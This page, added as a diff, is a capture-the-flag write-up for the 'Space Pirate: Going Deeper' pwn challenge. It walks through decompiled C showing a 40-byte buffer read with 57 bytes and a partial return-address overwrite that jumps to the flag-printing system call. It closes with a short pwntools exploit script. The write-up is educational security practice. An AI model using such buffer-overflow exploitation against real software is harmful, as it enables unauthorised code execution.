@@ -1,0 +1,201 @@
+<?xml version="1.0" encoding="utf-8"?>
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN"
+"http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml" lang="en" xml:lang="en">
+<head>
+<!-- 2025-05-05 Mon 21:34 -->
+<meta http-equiv="Content-Type" content="text/html;charset=utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>Space Pirate: Going Deeper</title>
+<meta name="generator" content="Org Mode" />
+<link rel="stylesheet" type="text/css" href="/style.css"/>
+</head>
+<body>
+<div id="content" class="content">
+<h1 class="title">Space Pirate: Going Deeper</h1>
+<p class="spacing-64" \>
+
+<p class="spacing-64" \>
+
+
+<p>
+The binary from this <code>pwn</code> challenge comes with two shared objects, one referring
+to <code>ld</code> and the other is some version of <code>libc</code>. For the binary to make use of these
+files, we launch it like this:
+</p>
+
+<div class="org-src-container">
+<pre class="src src-shell"><span class="org-variable-name">LD_PRELOAD</span>=<span class="org-string">"glibc/ld-linux-x86-64.so.2 glibc/libc.so.6"</span> ./sp_going_deeper
+</pre>
+</div>
+
+<p>
+Then we get a prompt with some options, one of them being <code>Login</code>, which seems to
+require a specific string.
+</p>
+
+
+<div id="orgc0a6779" class="figure">
+<p><img src="writeup-img/2025-02-04_18-10-07_screenshot.png" alt="2025-02-04_18-10-07_screenshot.png" />
+</p>
+</div>
+
+<p>
+Opening the binary in IDA Pro, we get a glimpse of how simple this program is
+and how to get the flag. We have the login string in plain text, but it's also
+possible to see that, if we want the flag to be printed, the values of <code>a</code>, <code>b</code> and
+<code>c</code>, in the screenshot above, are to be changed. So it doesn't matter at all
+having just the login name. The goal is to find a way to manipulate those three
+values, isn't it? Most likely not, as you will see.
+</p>
+
+<div class="org-src-container">
+<pre class="src src-c"><span class="org-type">int</span> <span class="org-variable-name">__fastcall</span> admin_panel(<span class="org-type">__int64</span> <span class="org-variable-name">a1</span>, <span class="org-type">__int64</span> <span class="org-variable-name">a2</span>, __int64 a3)
+{
+  <span class="org-type">char</span> <span class="org-variable-name">buf</span>[40]; <span class="org-comment-delimiter">// </span><span class="org-comment">[rsp+20h] [rbp-30h] BYREF</span>
+  <span class="org-type">__int64</span> <span class="org-variable-name">num</span>; <span class="org-comment-delimiter">// </span><span class="org-comment">[rsp+48h] [rbp-8h]</span>
+
+  num = 0LL;
+  printf(
+    <span class="org-string">"[*] Safety mechanisms are enabled!\n"</span>
+    <span class="org-string">"[*] Values are set to: a = [%x], b = [%ld], c = [%ld].\n"</span>
+    <span class="org-string">"[*] If you want to continue, disable the mechanism or login as admin.\n"</span>,
+    a1,
+    a2,
+    a3);
+  <span class="org-keyword">while</span> ( num != 1 &amp;&amp; num != 2 &amp;&amp; num != 3 )
+  {
+    printf(a1DisableMechan);
+    num = read_num();
+  }
+  <span class="org-keyword">if</span> ( num == 1 )
+  {
+    printf(<span class="org-string">"\n[*] Input: "</span>);
+  }
+  <span class="org-keyword">else</span>
+  {
+    <span class="org-keyword">if</span> ( num != 2 )
+    {
+      puts(<span class="org-string">"\n[!] Exiting..\n"</span>);
+      exit(6969);
+    }
+    printf(<span class="org-string">"\n[*] Username: "</span>);
+  }
+  read(0, buf, 57uLL);
+  <span class="org-keyword">if</span> ( a1 == <span class="org-warning">'</span>\xDE\xAD\xBE\xEF<span class="org-warning">'</span>
+    &amp;&amp; a2 == <span class="org-warning">'</span>\x137\xC0\xDE<span class="org-warning">'</span>
+    &amp;&amp; a3 == <span class="org-warning">'</span>\x137\xBE\xEF<span class="org-warning">'</span>
+    &amp;&amp; strncmp(<span class="org-string">"DRAEGER15th30n34nd0nly4dm1n15tr4t0R0fth15sp4c3cr4ft"</span>, buf, 52uLL) )
+  {
+    printf(<span class="org-string">"\n%s[+] Welcome admin! The secret message is: "</span>, <span class="org-string">"\x1B[1;32m"</span>);
+    system(<span class="org-string">"cat flag*"</span>);
+  }
+  <span class="org-keyword">else</span>
+  {
+    printf(<span class="org-string">"\n%s[-] Authentication failed!\n"</span>, <span class="org-string">"\x1B[1;31m"</span>);
+  }
+  <span class="org-keyword">return</span> puts(<span class="org-string">"\n[!] For security reasons, you are logged out..\n"</span>);
+}
+</pre>
+</div>
+
+<p>
+One thing that is fast to verify is that the <code>buf</code>, used for the user input, is
+only 40 bytes long, while the <code>read</code> function accepts 57 bytes and the <code>strncmp</code>
+function is trying to compare 52 bytes. So, clearly, the read function can
+trigger a buffer overflow.
+</p>
+
+<p>
+I tried, at first, running the binary in <code>GDB</code> and inserted 60 characters (<code>A</code>). The
+binary crashed at address <code>0x400b41</code> and three <code>A</code>'s were printed to the output.
+</p>
+
+
+
+<div id="org6f2d701" class="figure">
+<p><img src="writeup-img/2025-02-04_21-30-24_screenshot.png" alt="2025-02-04_21-30-24_screenshot.png" />
+</p>
+</div>
+
+<p>
+This did lead me to believe that the 57th byte would fill the last part of the
+address <code>0x400bXX</code>. As a test, I changed the input to be 56 <code>A</code>'s and 1 <code>C</code>. And there
+we go! The address was now <code>0x400b43</code>, where <code>0x43</code> equals <code>C</code>.
+</p>
+
+
+
+<div id="org225708f" class="figure">
+<p><img src="writeup-img/2025-02-04_21-32-18_screenshot.png" alt="2025-02-04_21-32-18_screenshot.png" />
+</p>
+</div>
+
+
+<p>
+The address we can use to execute the <code>system("cat flag*")</code> part of the code is
+<code>0x400b12</code>, therefore, the 57th character should be <code>0x12</code>.
+</p>
+
+
+
+<div id="org4a2bda3" class="figure">
+<p><img src="writeup-img/2025-02-04_21-34-29_screenshot.png" alt="2025-02-04_21-34-29_screenshot.png" />
+</p>
+</div>
+
+<p>
+For this, I wrote a <code>Python</code> script with <code>pwnlib</code> to send the payload:
+</p>
+
+<div class="org-src-container">
+<pre class="src src-python"><span class="org-keyword">from</span> pwn <span class="org-keyword">import</span> <span class="org-operator">*</span>
+
+<span class="org-variable-name">p</span> <span class="org-operator">=</span> process(<span class="org-string">"./sp_going_deeper"</span>)
+
+<span class="org-comment-delimiter"># </span><span class="org-comment">select first option</span>
+p.sendline(b<span class="org-string">'1'</span>)
+<span class="org-comment-delimiter"># </span><span class="org-comment">send input</span>
+p.sendline(b<span class="org-string">'A'</span> <span class="org-operator">*</span> 56 <span class="org-operator">+</span> b<span class="org-string">'</span><span class="org-constant">\x12</span><span class="org-string">'</span>)
+
+<span class="org-variable-name">lines</span> <span class="org-operator">=</span> p.recvall()
+<span class="org-builtin">print</span>(lines)
+
+p.close()
+
+</pre>
+</div>
+
+<p>
+Lo and behold, we got the local flag. I then tried the exploit on the remote
+address to complete the challenge!
+</p>
+
+
+
+<div id="org3f8c49b" class="figure">
+<p><img src="writeup-img/2025-02-04_21-38-06_screenshot.png" alt="2025-02-04_21-38-06_screenshot.png" />
+</p>
+</div>
+<hr>
+<footer>
+  <div class="container">
+    <ul class="menu-list">
+      <li class="menu-list-item flex-basis-100-margin fit-content">
+        <a href="/index.html">Home</a>
+      </li>
+      <li class="menu-list-item flex-basis-100-margin fit-content">
+        <a href="/articles/articles.html">Articles</a>
+      </li>
+      <li class="menu-list-item flex-basis-100-margin fit-content">
+        <a href="/writeups/htb/index.html">Write-Ups</a>
+      </li>
+      <li class="menu-list-item flex-basis-100-margin fit-content">
+        <a class="inactive-link">04-02-2025</a>
+      </li>
+    </ul>
+  </div>
+</footer>
+</div>
+</body>
+</html>
